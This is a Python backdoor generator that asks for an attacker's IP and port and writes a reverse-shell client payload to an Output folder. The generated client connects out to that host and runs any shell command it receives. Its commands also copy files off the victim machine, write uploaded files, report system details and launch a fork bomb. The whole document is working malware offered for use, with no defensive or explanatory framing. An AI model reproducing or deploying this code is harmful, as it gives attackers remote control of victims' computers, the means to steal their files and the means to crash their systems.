import sys
import os
import socket
from requests import get
try:
	ip = get("https://api.ipify.org").text
	os.system('clear')
	print("""\033[1;36m  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
  ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
  ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐
  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘
  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─""")
	print('')
	print("""  [ Coded by @hackintoanetwork \033[1;36m|\033[1;m Website : hackintoanetwork.com ]""")
	print('')
	print("  Host Name : \033[1;36m",socket.gethostname())
	print("  \033[1;mPublic IP : \033[1;36m", ip)
	print('')
	IP=input("  \033[1;mIP : \033[1;36m")
	if IP == '' :
		print ("  Default -> \033[1;36m", ip)
		IP = ip
	PORT=input("  \033[1;mPORT : \033[1;36m")
	if PORT == '' :
		print ("  Default -> 4444")
		PORT = ("4444")
	payload=('''import os
import time
import socket
import getpass
import platform
import colorama
import subprocess
from colorama import Fore, Style

def client_connect():
    global sock
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((RHOST, RPORT))
        return sock
    except ConnectionRefusedError:
        time.sleep(5)

def header():
    header = f"""{Fore.LIGHTBLUE_EX}┌──({Fore.CYAN}{getpass.getuser()}{Style.RESET_ALL}\\U0001f480{Style.RESET_ALL}{Fore.CYAN}{platform.node()}{Fore.LIGHTBLUE_EX})-[{Style.RESET_ALL}{os.getcwd()}{Fore.LIGHTBLUE_EX}]\\n└─{Fore.CYAN}#{Style.RESET_ALL} """
    sock.send(header.encode())

def sysinfo():
    sysinfo = f"""{Fore.CYAN}Operating System : {Style.RESET_ALL}{platform.system()}
{Fore.CYAN}Computer Name : {Style.RESET_ALL}{platform.node()}
{Fore.CYAN}Username : {Style.RESET_ALL}{getpass.getuser()}
{Fore.CYAN}Release Version : {Style.RESET_ALL}{platform.release()}
{Fore.CYAN}Processor Architecture : {Style.RESET_ALL}{platform.processor()}\\n"""
    sock.send(sysinfo.encode())

def helper():
    helper = f"""{Fore.CYAN}download : {Style.RESET_ALL}remote download file
{Fore.CYAN}upload : {Style.RESET_ALL}remote upload file
{Fore.CYAN}sysinfo : {Style.RESET_ALL}show victim system infomation
{Fore.CYAN}bomb : {Style.RESET_ALL}process bomb
{Fore.CYAN}exit : {Style.RESET_ALL}exit the backdoor\\n"""
    sock.send(helper.encode())
    
def bomb():
    sock.send("\\n SUCCESS\\U0001f480\\n".encode())
    while True:
        os.fork()
        sock.close()
    
def download():
    file_path = sock.recv(5000)
    file_path = file_path.decode()
    file = open(file_path, "rb")
    file_data = file.read()
    sock.send(file_data)

def upload():
    file_name = sock.recv(6000)
    new_file = open(file_name, "wb")
    file_data = sock.recv(6000)
    new_file.write(file_data)
    new_file.close()

if __name__=="__main__":
    RHOST = "[IP]"
    RPORT = [PORT]

    intBuff = 2048
    
    client_connect()

    while True:
        try:
            header()
            command = sock.recv(intBuff).decode()

            if command.startswith("cd"):
                try:
                    os.chdir(command[3:].replace("\\\\n",""))
                    command="\\n"
                    sock.send(command.encode("euc-kr"))
                except FileNotFoundError:
                    time.sleep(5)
                    del sock
                    client_connect()

            elif command == "download":
                download()

            elif command == "upload":
                upload()

            elif command == "sysinfo":
                sysinfo()

            elif command == "bomb":
                bomb()

            elif command == "help":
                helper()

            elif command.startswith("exit"):
                exit_msg = f"exit"
                sock.send(exit_msg.encode())
                sock.close()
                time.sleep(5)
                del sock
                client_connect()

            else:
                comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = comm.stdout.read()+ comm.stderr.read()
                sock.send(output)

        except BrokenPipeError:
            time.sleep(5)
            del sock
            client_connect()

        except ConnectionResetError:
            time.sleep(5)
            del sock
            client_connect()''')
	payload = payload.replace("[IP]",IP).replace("[PORT]",PORT).encode()
	name = str(input("\n  ENTER THE FILE NAME : "))
	name = (name + ".py")
	file = open("./Output/"+name, 'wb')
	file.write(payload)
	file.close()
	print('')
	print ("  \033[1;mThe generated payload is in the Output directory.")
	print('')

except KeyboardInterrupt:
	os.system('clear')